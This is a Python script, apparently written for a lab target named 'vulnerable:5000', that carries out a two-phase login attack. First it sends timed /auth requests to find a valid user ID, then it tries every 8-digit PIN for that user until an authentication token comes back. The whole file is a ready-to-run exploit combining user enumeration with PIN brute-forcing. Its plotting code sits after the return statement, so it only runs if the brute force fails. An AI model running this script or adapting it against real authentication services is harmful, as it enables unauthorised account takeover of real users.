import requests, time, statistics, matplotlib.pyplot as plt

BASE_URL = "http://vulnerable:5000"

def time_attack():
    # Phase 1: Find valid user via timing
    timings = {}
    for uid in range(1000, 2000):
        times = []
        for _ in range(5):  # Multiple samples
            start = time.perf_counter()
            requests.post(f"{BASE_URL}/auth", json={"user_id": uid, "pin": "00000000"})
            times.append(time.perf_counter() - start)
        timings[uid] = statistics.median(times)
    
    valid_user = max(timings, key=timings.get)
    print(f"[+] Identified user: {valid_user} (Δ={timings[valid_user]:.4f}s)")

    # Phase 2: Brute-force PIN
    for pin in (f"{i:08d}" for i in range(100000000)):
        response = requests.post(f"{BASE_URL}/auth", 
            json={"user_id": valid_user, "pin": pin})
        if "token" in response.json():
            print(f"[+] Cracked PIN: {pin}")
            return (valid_user, pin)

    # Visualization
    plt.bar(timings.keys(), timings.values())
    plt.xlabel("User ID")
    plt.ylabel("Response Time (s)")
    plt.title("Timing Attack Results")
    plt.show()

if __name__ == "__main__":
    time_attack()
